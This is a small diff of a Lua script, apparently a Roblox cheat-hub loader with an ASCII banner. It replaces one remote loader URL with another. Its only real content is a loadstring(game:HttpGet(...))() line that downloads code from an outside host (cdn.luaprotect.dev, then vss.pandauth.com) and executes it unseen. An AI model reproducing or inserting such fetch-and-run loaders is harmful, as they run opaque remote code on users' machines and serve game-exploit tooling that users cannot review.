@@ -6,4 +6,4 @@
    |_|\__,_|_| |_|   |_| |_|\__,_|_.__/ 
 ]]
 
-loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/7a4824/GmCoDC8gW8dQAPmU"))()
+loadstring(game:HttpGet("https://vss.pandauth.com/kv/17e5097201a66119"))()
